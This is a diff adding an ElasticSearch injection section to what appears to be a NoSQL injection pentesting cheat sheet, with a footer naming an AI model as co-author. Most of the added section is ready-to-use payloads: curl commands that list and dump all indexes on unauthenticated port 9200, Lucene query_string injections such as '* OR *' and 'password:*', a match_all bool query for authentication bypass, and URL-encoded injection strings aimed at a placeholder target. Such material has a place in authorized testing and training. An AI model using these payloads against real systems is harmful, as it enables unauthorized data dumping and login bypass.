@@ -256,6 +256,56 @@ curl http://target.com:5984/users/<doc_id>
 
 ---
 
+## ElasticSearch Injection
+
+ElasticSearch uses a JSON Query DSL over HTTP. Injection occurs when user input is unsafely embedded in queries — especially `query_string` queries which support Lucene syntax including boolean operators and wildcards.
+
+```bash
+# Direct API access (common if port 9200 is exposed with no auth)
+curl http://target.com:9200/_cat/indices          # list all indexes
+curl http://target.com:9200/_cat/indices?v        # verbose with names
+curl http://target.com:9200/<index>/_search       # dump all docs in index
+curl http://target.com:9200/<index>/_mapping      # show field schema
+```
+
+**query_string injection — Lucene syntax:**
+
+```json
+// Normal query (user input = "admin"):
+{"query": {"query_string": {"query": "admin", "default_field": "username"}}}
+
+// Inject Lucene boolean — return all docs:
+{"query": {"query_string": {"query": "admin OR *"}}}
+{"query": {"query_string": {"query": "* OR *"}}}
+
+// Wildcard all:
+{"query": {"query_string": {"query": "*"}}}
+
+// Field extraction — force match on any value in a field:
+{"query": {"query_string": {"query": "password:*"}}}
+```
+
+**Auth bypass via bool query injection:**
+
+```json
+// If app builds: {"query": {"match": {"username": USER_INPUT}}}
+// Swap to bool with match_all to return all users:
+{"query": {"bool": {"should": [{"match_all": {}}], "minimum_should_match": 1}}}
+```
+
+**Injection via URL parameter (if ES query_string passed in URL):**
+
+```bash
+# Inject Lucene syntax into search param
+curl "http://target.com/search?q=admin+OR+*"
+curl "http://target.com/search?q=*:*"
+curl "http://target.com/api/users?filter=admin%22+OR+%22*%22:%22*"
+```
+
+> [!note] ElasticSearch 8.x enables security by default (TLS + auth). Older deployments (6.x/7.x) often have no auth — check 9200 during internal network access.
+
+---
+
 ## Filter Bypasses
 
 ### Case sensitivity (MongoDB operators are case-sensitive — `$NE` doesn't work)
@@ -314,5 +364,5 @@ $gt → %24gt
 ---
 
 *Created: 2026-02-27*
-*Updated: 2026-05-13*
+*Updated: 2026-05-14*
 *Model: claude-sonnet-4-6*
